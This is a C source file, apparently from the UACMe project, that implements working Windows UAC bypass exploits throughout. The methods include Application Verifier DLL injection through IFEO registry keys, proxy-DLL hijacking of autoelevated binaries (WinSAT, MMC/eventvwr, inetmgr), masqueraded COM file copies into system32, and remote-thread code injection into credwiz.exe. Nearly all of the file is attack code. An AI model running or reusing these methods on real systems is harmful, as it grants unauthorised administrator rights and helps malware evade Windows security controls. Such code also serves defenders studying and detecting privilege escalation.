/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2015 - 2016
*
*  TITLE:       HYBRIDS.C
*
*  VERSION:     2.10
*
*  DATE:        16 Apr 2016
*
*  Hybrid UAC bypass methods.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"
#include "makecab.h"

ELOAD_PARAMETERS_SIREFEF g_ElevParamsSirefef;

/*
* ucmAvrfMethod
*
* Purpose:
*
* Acquire elevation through Application Verifier dll injection.
*
*/
BOOL ucmAvrfMethod(
    CONST PVOID AvrfDll,
    DWORD AvrfDllSize
    )
{
    BOOL bResult = FALSE, cond = FALSE;
    HKEY hKey = NULL, hSubKey = NULL;
    LRESULT lRet;
    DWORD dwValue = 0x100; // FLG_APPLICATION_VERIFIER;
    WCHAR szCmd[MAX_PATH * 4];
    WCHAR szSourceDll[MAX_PATH * 2];

    if (
        (AvrfDll == NULL) ||
        (AvrfDllSize == 0)
        )
    {
        return bResult;
    }

    do {

        //
        // Set new key security dacl
        // Red Alert: manually restore IFEO key permissions after using this tool, as they are not inherited.
        //
        if (!ucmMasqueradedAlterObjectSecurityCOM(T_IFEO, DACL_SECURITY_INFORMATION, SE_REGISTRY_KEY, T_SDDL_ALL_FOR_EVERYONE))
            break;

        //open IFEO key
        lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options"),
            0, KEY_ALL_ACCESS, &hKey);
        if ((lRet != ERROR_SUCCESS) || (hKey == NULL))
            break;

        //Set new key and values
        hSubKey = NULL;
        lRet = RegCreateKey(hKey, CLICONFG_EXE, &hSubKey);
        if ((hSubKey == NULL) || (lRet != ERROR_SUCCESS))
            break;

        lRet = RegSetValueEx(hSubKey, TEXT("GlobalFlag"), 0, REG_DWORD, (BYTE*)&dwValue, sizeof(DWORD));
        if (lRet != ERROR_SUCCESS)
            break;

        dwValue = (DWORD)_strlen(HIBIKI_DLL) * sizeof(TCHAR);
        lRet = RegSetValueEx(hSubKey, TEXT("VerifierDlls"), 0, REG_SZ, (BYTE*)&HIBIKI_DLL, dwValue);
        if (lRet != ERROR_SUCCESS)
            break;

        // Cleanup registry, we don't need anymore.
        RegCloseKey(hSubKey);
        hSubKey = NULL;
        RegCloseKey(hKey);
        hKey = NULL;

        //
        // Extract file to the protected directory
        // First, create cab with fake msu ext, second run fusion process.
        //
        RtlSecureZeroMemory(szSourceDll, sizeof(szSourceDll));
        _strcpy(szSourceDll, g_ctx.szTempDirectory);
        _strcat(szSourceDll, HIBIKI_DLL);
        if (!ucmCreateCabinetForSingleFile(szSourceDll, AvrfDll, AvrfDllSize))
            break;

        // Drop Hibiki to system32
        if (!ucmWusaExtractPackage(CMD_EXTRACT_SYSTEM32))
            break;

        // Finally run target fusion process.
        RtlSecureZeroMemory(szCmd, sizeof(szCmd));
        _strcpy(szCmd, g_ctx.szSystemDirectory);
        _strcat(szCmd, CLICONFG_EXE);
        bResult = supRunProcess(szCmd, NULL);

    } while (cond);

    if (hKey != NULL) {
        RegCloseKey(hKey);
    }
    if (hSubKey != NULL) {
        RegCloseKey(hSubKey);
    }
    return bResult;
}

/*
* ucmWinSATMethod
*
* Purpose:
*
* Acquire elevation through abusing APPINFO.DLL whitelisting model logic and wusa installer/IFileOperation autoelevation.
* Slightly modified target and proxydll can work almost with every autoelevated/whitelisted application.
* This method uses advantage of wusa to write to the protected folders, but can be adapted to IFileOperation too.
* WinSAT used for demonstration purposes only.
*
*/
BOOL ucmWinSATMethod(
    LPWSTR lpTargetDll,
    PVOID ProxyDll,
    DWORD ProxyDllSize,
    BOOL UseWusa
    )
{
    BOOL bResult = FALSE, cond = FALSE;
    CABDATA *Cabinet = NULL;
    WCHAR szSource[MAX_PATH * 2];
    WCHAR szDest[MAX_PATH * 2];
    WCHAR szBuffer[MAX_PATH * 2];

    if (
        (ProxyDll == NULL) ||
        (ProxyDllSize == 0) ||
        (lpTargetDll == NULL)
        )
    {
        return bResult;
    }

    if (_strlen(lpTargetDll) > 100) {
        return bResult;
    }

    RtlSecureZeroMemory(szSource, sizeof(szSource));
    RtlSecureZeroMemory(szDest, sizeof(szDest));

    do {

        _strcpy(szSource, g_ctx.szSystemDirectory);
        _strcat(szSource, WINSAT_EXE);

        _strcpy(szDest, g_ctx.szTempDirectory);
        _strcat(szDest, WINSAT_EXE);

        // Copy winsat to temp directory
        if (!CopyFile(szSource, szDest, FALSE)) {
            OutputDebugString(L"[UCM] Target application not found");
            break;
        }

        //put target dll
        RtlSecureZeroMemory(szSource, sizeof(szSource));
        _strcpy(szSource, g_ctx.szTempDirectory);
        _strcat(szSource, lpTargetDll);

        //write proxy dll to disk
        if (!supWriteBufferToFile(szSource, ProxyDll, ProxyDllSize)) {
            break;
        }

        //
        // Two options: use wusa installer or IFileOperation
        //
        if (UseWusa) {

            //build cabinet
            _strcpy(szBuffer, g_ctx.szTempDirectory);
            _strcat(szBuffer, ELLOCNAK_MSU);

            Cabinet = cabCreate(szBuffer);
            if (Cabinet) {

                _strcpy(szDest, g_ctx.szTempDirectory);
                _strcat(szDest, WINSAT_EXE);

                //put proxy dll inside cabinet
                cabAddFile(Cabinet, szSource, lpTargetDll);

                //put winsat.exe
                cabAddFile(Cabinet, szDest, WINSAT_EXE);
                cabClose(Cabinet);
                Cabinet = NULL;
            }
            else {
                break;
            }

            //extract package
            bResult = ucmWusaExtractPackage(CMD_EXTRACT_WINSAT);
        }
        else {

            //wusa extract banned, switch to IFileOperation.
            RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
            _strcpy(szBuffer, g_ctx.szSystemDirectory);
            _strcat(szBuffer, SYSPREP_DIR);

            bResult = ucmMasqueradedCopyFileCOM(szSource, szBuffer);
            if (!bResult) {
                break;
            }
            bResult = ucmMasqueradedCopyFileCOM(szDest, szBuffer);
            if (!bResult) {
                break;
            }
        }

    } while (cond);

    if (bResult) {

        NtYieldExecution();//put your signature here

        //run winsat
        RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
        _strcpy(szBuffer, g_ctx.szSystemDirectory);
        _strcat(szBuffer, SYSPREP_DIR);
        _strcat(szBuffer, WINSAT_EXE);

        bResult = supRunProcess(szBuffer, NULL);
        //cleanup of the above files must be done by payload code
    }

    if (Cabinet) {
        cabClose(Cabinet);
    }
    //remove trash from %temp%
    if (szDest[0] != 0) {
        DeleteFileW(szDest);
    }
    if (szSource[0] != 0) {
        DeleteFileW(szSource);
    }

    return bResult;
}

/*
* ucmMMCMethod
*
* Purpose:
*
* Bypass UAC by abusing MMC.exe backdoor hardcoded in appinfo.dll
*
*/
BOOL ucmMMCMethod(
    LPWSTR lpTargetDll,
    PVOID ProxyDll,
    DWORD ProxyDllSize
    )
{
    BOOL bResult = FALSE, cond = FALSE;
    WCHAR szSource[MAX_PATH * 2];
    WCHAR szDest[MAX_PATH * 2];

    if ((ProxyDll == NULL) || (ProxyDllSize == 0) || (lpTargetDll == NULL)) {
        return bResult;
    }

    if (_strlen(lpTargetDll) > 100) {
        return bResult;
    }

    do {

        //check if file exists (like on srv for example)
        RtlSecureZeroMemory(szDest, sizeof(szDest));
        _strcpy(szDest, g_ctx.szSystemDirectory);
        _strcat(szDest, lpTargetDll);
        if (PathFileExists(szDest)) {
            OutputDebugString(L"[UCM] Target dll already exists, abort");
            break;
        }

        //put target dll
        RtlSecureZeroMemory(szSource, sizeof(szSource));
        _strcpy(szSource, g_ctx.szTempDirectory);
        _strcat(szSource, lpTargetDll);

        //write proxy dll to disk
        if (!supWriteBufferToFile(szSource, ProxyDll, ProxyDllSize)) {
            break;
        }

        //target dir
        RtlSecureZeroMemory(szDest, sizeof(szDest));
        _strcpy(szDest, g_ctx.szSystemDirectory);

        //drop fubuki to system32
        bResult = ucmMasqueradedCopyFileCOM(szSource, szDest);
        if (!bResult) {
            break;
        }

        //run mmc console
        //because of mmc harcoded backdoor uac will autoelevate mmc with valid and trusted MS command
        //event viewer will attempt to load not existing dll, so we will give him our little friend
        bResult = supRunProcess(MMC_EXE, EVENTVWR_MSC);

    } while (cond);

    return bResult;
}

/*
* ucmElevatedLaunchProc
*
* Purpose:
*
* Elevation procedure used by Sirefef method
*
*/
DWORD WINAPI ucmElevatedLaunchProc(
    ELOAD_PARAMETERS_SIREFEF *elvpar
    )
{
    SHELLEXECUTEINFOW   shexec;

    if (elvpar == NULL)
        return (DWORD)E_FAIL;

    shexec.cbSize = sizeof(shexec);
    shexec.fMask = SEE_MASK_NOCLOSEPROCESS;
    shexec.nShow = SW_SHOW;
    shexec.lpVerb = elvpar->szVerb;
    shexec.lpFile = elvpar->szTargetApp;
    shexec.lpParameters = NULL;
    shexec.lpDirectory = NULL;
    if (elvpar->xShellExecuteExW(&shexec))
        if (shexec.hProcess != NULL) {
            elvpar->xWaitForSingleObject(shexec.hProcess, INFINITE);
            elvpar->xCloseHandle(shexec.hProcess);
        }

    return S_OK;
}

/*
* ucmSirefefMethod
*
* Purpose:
*
* Bypass UAC by abusing OOBE.exe backdoor hardcoded in appinfo.dll
*
*/
BOOL ucmSirefefMethod(
    PVOID ProxyDll,
    DWORD ProxyDllSize
    )
{
    BOOL                      cond = FALSE, bResult = FALSE;
    DWORD                     c;
    HANDLE                    hProcess = NULL, hRemoteThread = NULL;
    HINSTANCE                 selfmodule = GetModuleHandle(NULL);
    PIMAGE_DOS_HEADER         pdosh = (PIMAGE_DOS_HEADER)selfmodule;
    PIMAGE_FILE_HEADER        fh = (PIMAGE_FILE_HEADER)((char *)pdosh + pdosh->e_lfanew + sizeof(DWORD));
    PIMAGE_OPTIONAL_HEADER    opth = (PIMAGE_OPTIONAL_HEADER)((char *)fh + sizeof(IMAGE_FILE_HEADER));
    LPVOID                    remotebuffer = NULL, newEp, newDp;
    SIZE_T                    NumberOfBytesWritten = 0;
    ELOAD_PARAMETERS_SIREFEF *elvpar = &g_ElevParamsSirefef;
    LPVOID                    elevproc = ucmElevatedLaunchProc;

    WCHAR szBuffer[MAX_PATH * 2];
    WCHAR szDest[MAX_PATH * 2];
    WCHAR szSource[MAX_PATH * 2];

    if (
        (ProxyDll == NULL) ||
        (ProxyDllSize == 0)
        )
    {
        return bResult;
    }

    do {
        //put Fubuki dll as netutils to %temp%
        RtlSecureZeroMemory(szSource, sizeof(szSource));
        _strcpy(szSource, g_ctx.szTempDirectory);
        _strcat(szSource, NETUTILS_DLL);
        if (!supWriteBufferToFile(szSource, ProxyDll, ProxyDllSize)) {
            break;
        }

        //copy dll to wbem target folder
        RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
        _strcpy(szBuffer, g_ctx.szSystemDirectory);
        _strcat(szBuffer, WBEM_DIR);
        bResult = ucmMasqueradedCopyFileCOM(szSource, szBuffer);
        if (!bResult) {
            break;
        }

        //copy 1st stage target process
        RtlSecureZeroMemory(szSource, sizeof(szSource));
        _strcpy(szSource, g_ctx.szSystemDirectory);
        _strcat(szSource, CREDWIZ_EXE);

        RtlSecureZeroMemory(szDest, sizeof(szDest));
        _strcpy(szDest, g_ctx.szTempDirectory);
        _strcat(szDest, OOBE_EXE);
        if (!CopyFile(szSource, szDest, FALSE)) {
            break;
        }

        bResult = ucmMasqueradedCopyFileCOM(szDest, szBuffer);
        if (!bResult) {
            break;
        }

        //setup basic shellcode routines
        RtlSecureZeroMemory(&g_ElevParamsSirefef, sizeof(g_ElevParamsSirefef));
        elvpar->xShellExecuteExW = (pfnShellExecuteExW)GetProcAddress(g_ctx.hShell32, "ShellExecuteExW");
        elvpar->xWaitForSingleObject = (pfnWaitForSingleObject)GetProcAddress(g_ctx.hKernel32, "WaitForSingleObject");
        elvpar->xCloseHandle = (pfnCloseHandle)GetProcAddress(g_ctx.hKernel32, "CloseHandle");

        //set shellcode 2nd stage target process
        //c:\windows\system32\wbem\oobe.exe
        RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
        _strcpy(elvpar->szTargetApp, g_ctx.szSystemDirectory);
        _strcat(elvpar->szTargetApp, WBEM_DIR);
        _strcat(elvpar->szTargetApp, OOBE_EXE);
        _strcpy(elvpar->szVerb, RUNAS_VERB);

        _strcpy(szBuffer, g_ctx.szSystemDirectory); //c:\windows\system32\credwiz.exe
        _strcat(szBuffer, CREDWIZ_EXE);

        //run 1st stage target process
        hProcess = supRunProcessEx(szBuffer, NULL, NULL);
        if (hProcess == NULL) {
            break;
        }

        remotebuffer = VirtualAllocEx(hProcess, NULL, (SIZE_T)opth->SizeOfImage,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        if (remotebuffer == NULL) {
            break;
        }
        if (!WriteProcessMemory(hProcess, remotebuffer, selfmodule, opth->SizeOfImage, &NumberOfBytesWritten)) {
            break;
        }

        newEp = (char *)remotebuffer + ((char *)elevproc - (char *)selfmodule);
        newDp = (char *)remotebuffer + ((char *)elvpar - (char *)selfmodule);

        hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, newEp, newDp, 0, &c);
        bResult = (hRemoteThread != NULL);
        if (bResult) {
            WaitForSingleObject(hRemoteThread, INFINITE);
            CloseHandle(hRemoteThread);
        }

    } while (cond);

    if (hProcess != NULL) {
        TerminateProcess(hProcess, 0);
        CloseHandle(hProcess);
    }
    return bResult;
}

/*
* ucmGenericAutoelevation
*
* Purpose:
*
* Bypass UAC by abusing target autoelevated system32 application via missing system32 dll
*
*/
BOOL ucmGenericAutoelevation(
    LPWSTR lpTargetApp,
    LPWSTR lpTargetDll,
    PVOID ProxyDll,
    DWORD ProxyDllSize
    )
{
    BOOL bResult = FALSE, cond = FALSE;
    WCHAR szSource[MAX_PATH * 2];
    WCHAR szDest[MAX_PATH * 2];

    if (
        (ProxyDll == NULL) ||
        (ProxyDllSize == 0) ||
        (lpTargetApp == NULL) ||
        (lpTargetDll == NULL)
        )
    {
        return bResult;
    }

    if (_strlen(lpTargetDll) > 100) {
        return bResult;
    }

    do {

        //put target dll
        RtlSecureZeroMemory(szSource, sizeof(szSource));
        _strcpy(szSource, g_ctx.szTempDirectory);
        _strcat(szSource, lpTargetDll);

        //write proxy dll to disk
        if (!supWriteBufferToFile(szSource, ProxyDll, ProxyDllSize)) {
            break;
        }

        //target dir
        RtlSecureZeroMemory(szDest, sizeof(szDest));
        _strcpy(szDest, g_ctx.szSystemDirectory);

        //drop fubuki to system32
        bResult = ucmMasqueradedCopyFileCOM(szSource, szDest);
        if (!bResult) {
            break;
        }

        //run target app
        bResult = supRunProcess(lpTargetApp, NULL);

    } while (cond);

    return bResult;
}

/*
* ucmGWX
*
* Purpose:
*
* Bypass UAC by abusing newly added appinfo.dll backdoor.
* IIS initially not installed in Windows client, but appinfo.dll whitelists IIS application as autoelevated.
* We will use backdoor from "Get Windows 10" bullshit marketing promo package and exploit it with dll hijacking as usual.
*
*/
BOOL ucmGWX(
    VOID
    )
{
    BOOL bResult = FALSE, cond = FALSE;
    WCHAR szDest[MAX_PATH * 2];
    WCHAR szSource[MAX_PATH * 2];

    WCHAR szTargetApp[MAX_PATH * 2];

    PVOID Data = NULL, Ptr = NULL;
    ULONG DecompressedBufferSize = 0, DataSize = 0;

    do {

        //target dir
        RtlSecureZeroMemory(szDest, sizeof(szDest));
        _strcpy(szDest, g_ctx.szSystemDirectory);
        _strcat(szDest, INETSRV_DIR);
        _strcat(szDest, INETMGR_EXE);

        //File already exist, so IIS could be installed
        if (PathFileExists(szDest)) {
            OutputDebugString(L"[UCM] Target dll already exists, abort");
            break;
        }

        //summon some unicorns
        Ptr = supLdrQueryResourceData(KONGOU_ID, g_ctx.Peb->ImageBaseAddress, &DataSize);
        if (Ptr == NULL) {
            OutputDebugString(TEXT("[UCM] Resource not found"));
            break;
        }
        Data = DecompressPayload(Ptr, DataSize, &DecompressedBufferSize);
        if (Data == NULL)
            break;

        //write proxy dll to disk
        RtlSecureZeroMemory(szSource, sizeof(szSource));
        _strcpy(szSource, g_ctx.szTempDirectory);
        _strcat(szSource, SLC_DLL);
        if (!supWriteBufferToFile(szSource, g_ctx.PayloadDll, g_ctx.PayloadDllSize)) {
            break;
        }

        //drop fubuki to system32\inetsrv
        RtlSecureZeroMemory(szDest, sizeof(szDest));
        _strcpy(szDest, g_ctx.szSystemDirectory);
        _strcat(szDest, INETSRV_DIR);
        bResult = ucmMasqueradedCopyFileCOM(szSource, szDest);
        if (!bResult) {
            break;
        }

        //put target app
        RtlSecureZeroMemory(szSource, sizeof(szSource));
        _strcpy(szSource, g_ctx.szTempDirectory);
        _strcat(szSource, INETMGR_EXE);

        //write app to disk
        if (!supWriteBufferToFile(szSource, Data, DecompressedBufferSize)) {
            break;
        }

        //drop InetMgr.exe to system32\inetsrv
        bResult = ucmMasqueradedCopyFileCOM(szSource, szDest);
        if (!bResult) {
            break;
        }

        _strcpy(szTargetApp, szDest);
        _strcat(szTargetApp, INETMGR_EXE);
        bResult = supRunProcess(szTargetApp, NULL);
        if (bResult) {
            OutputDebugString(TEXT("Whoever created this gwx shit must be fired"));
        }

    } while (cond);

    if (Data != NULL) {
        VirtualFree(Data, 0, MEM_RELEASE);
    }
    return bResult;
}
